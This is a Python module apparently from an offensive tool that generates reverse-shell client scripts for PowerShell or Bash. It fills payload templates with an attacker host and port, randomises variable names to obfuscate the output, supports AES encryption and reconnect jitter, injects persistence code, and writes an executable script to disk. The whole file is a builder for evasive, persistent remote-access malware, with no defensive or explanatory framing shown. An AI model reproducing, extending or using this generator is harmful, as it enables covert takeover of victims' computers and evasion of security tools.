import os
import base64
from .utilities import generate_obfuscated_name, get_persistence_code
from .templates import PAYLOAD_TEMPLATES

def generate_client(config):
    template = PAYLOAD_TEMPLATES.get(config["shell_type"])
    if not template:
        raise ValueError(f"Unsupported shell type: {config['shell_type']}")

    # Obfuscated variable names
    obf_names = {
        "target_ip": generate_obfuscated_name(),
        "target_port": generate_obfuscated_name(),
        "encoding_scheme": generate_obfuscated_name(),
        "encryption_enabled": generate_obfuscated_name(),
        "encryption_type": generate_obfuscated_name(),
        "platform_os": generate_obfuscated_name(),
        "reconnect_jitter_min": generate_obfuscated_name(),
        "reconnect_jitter_max": generate_obfuscated_name(),
        "persistence_type": generate_obfuscated_name(),
        "magic_delimiter": generate_obfuscated_name(),
        "aes_key": generate_obfuscated_name(),
        "aes_iv": generate_obfuscated_name(),
        "encoding_map": generate_obfuscated_name(),
        "encrypt_func": generate_obfuscated_name(),
        "decrypt_func": generate_obfuscated_name(),
        "send_func": generate_obfuscated_name(),
        "recv_func": generate_obfuscated_name(),
        "client_core_func": generate_obfuscated_name(),
        "tcp_client_func": generate_obfuscated_name(),
        "persistence_func": generate_obfuscated_name(),
        "logger": generate_obfuscated_name(),
    }

    # Warnings for PowerShell/Bash
    if config["shell_type"] == "powershell_tcp" and config["encryption_enabled"] and config["encryption_type"] == "aes":
        print("[*] Warning: PowerShell uses .NET AES-256-CBC, not Fernet.")
    if config["shell_type"] == "bash_tcp" and config["encryption_enabled"] and config["encryption_type"] == "aes":
        config["encryption_enabled"] = False
        config["encoding_scheme"] = "base64"

    # Generate script
    script_content = template.format(
        lhost=config["lhost"],
        lport=config["port"],
        encoding_scheme=config["encoding_scheme"],
        encryption_enabled=str(config["encryption_enabled"]).lower(),
        encryption_type=config["encryption_type"],
        platform=config["platform"],
        reconnect_jitter_min=config["reconnect_jitter_min"],
        reconnect_jitter_max=config["reconnect_jitter_max"],
        persistence_type=config["persistence_type"],
        delimiter=config["delimiter"],
        aes_key_hex=config["aes_key_hex"],
        aes_iv_hex=config["aes_iv_hex"],
        persistence_code=get_persistence_code(config["persistence_type"], config["platform"], config["output_file"], obf_names["persistence_func"]),
        **{f"obf_{k}": v for k, v in obf_names.items()}
    )

    # Write to file
    if not os.path.exists(config["output_dir"]):
        os.makedirs(config["output_dir"])
    with open(config["output_file"], "w") as f:
        f.write(script_content)
    if config["shell_type"] == "bash_tcp":
        os.chmod(config["output_file"], 0o755)
    print(f"[*] Generated client script: {config['output_file']}")
